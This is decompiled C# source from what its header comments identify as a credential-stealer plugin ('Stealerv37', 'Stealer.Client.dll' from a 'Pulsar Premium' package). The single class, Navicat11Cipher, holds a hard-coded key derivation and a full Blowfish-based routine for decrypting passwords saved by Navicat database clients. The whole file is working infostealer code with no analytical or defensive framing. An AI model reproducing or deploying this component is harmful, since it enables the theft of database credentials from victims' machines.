// Decompiled with JetBrains decompiler
// Type: Intelix.Helper.Encrypted.Navicat11Cipher
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

#nullable disable
namespace Intelix.Helper.Encrypted;

public class Navicat11Cipher
{
  private Blowfish blowfishCipher;

  protected byte[] StringToByteArray(string hex)
  {
    return Enumerable.Range(0, hex.Length).Where<int>((Func<int, bool>) (x => x % 2 == 0)).Select<int, byte>((Func<int, byte>) (x => Convert.ToByte(hex.Substring(x, 2), 16 /*0x10*/))).ToArray<byte>();
  }

  protected void XorBytes(byte[] a, byte[] b, int len)
  {
    for (int index = 0; index < len; ++index)
      a[index] ^= b[index];
  }

  public Navicat11Cipher()
  {
    byte[] inputBuffer = new byte[8]
    {
      (byte) 51,
      (byte) 68,
      (byte) 67,
      (byte) 53,
      (byte) 67,
      (byte) 65,
      (byte) 51,
      (byte) 57
    };
    using (SHA1 sha1 = SHA1.Create())
    {
      byte[] hash = sha1.ComputeHash(inputBuffer);
      this.blowfishCipher = new Blowfish(hash);
    }
  }

  public string DecryptString(string ciphertext)
  {
    byte[] byteArray = this.StringToByteArray(ciphertext);
    byte[] array = Enumerable.Repeat<byte>(byte.MaxValue, this.blowfishCipher.BlockSize).ToArray<byte>();
    this.blowfishCipher.Encrypt(array, Blowfish.Endian.Big);
    byte[] numArray1 = new byte[0];
    int num1 = byteArray.Length / this.blowfishCipher.BlockSize;
    int num2 = byteArray.Length % this.blowfishCipher.BlockSize;
    byte[] numArray2 = new byte[this.blowfishCipher.BlockSize];
    byte[] numArray3 = new byte[this.blowfishCipher.BlockSize];
    for (int index = 0; index < num1; ++index)
    {
      Array.Copy((Array) byteArray, this.blowfishCipher.BlockSize * index, (Array) numArray2, 0, this.blowfishCipher.BlockSize);
      Array.Copy((Array) numArray2, (Array) numArray3, this.blowfishCipher.BlockSize);
      this.blowfishCipher.Decrypt(numArray2, Blowfish.Endian.Big);
      this.XorBytes(numArray2, array, this.blowfishCipher.BlockSize);
      numArray1 = ((IEnumerable<byte>) numArray1).Concat<byte>((IEnumerable<byte>) numArray2).ToArray<byte>();
      this.XorBytes(array, numArray3, this.blowfishCipher.BlockSize);
    }
    if (num2 != 0)
    {
      Array.Clear((Array) numArray2, 0, numArray2.Length);
      Array.Copy((Array) byteArray, this.blowfishCipher.BlockSize * num1, (Array) numArray2, 0, num2);
      this.blowfishCipher.Encrypt(array, Blowfish.Endian.Big);
      this.XorBytes(numArray2, array, this.blowfishCipher.BlockSize);
      numArray1 = ((IEnumerable<byte>) numArray1).Concat<byte>((IEnumerable<byte>) ((IEnumerable<byte>) numArray2).Take<byte>(num2).ToArray<byte>()).ToArray<byte>();
    }
    return Encoding.UTF8.GetString(numArray1);
  }
}
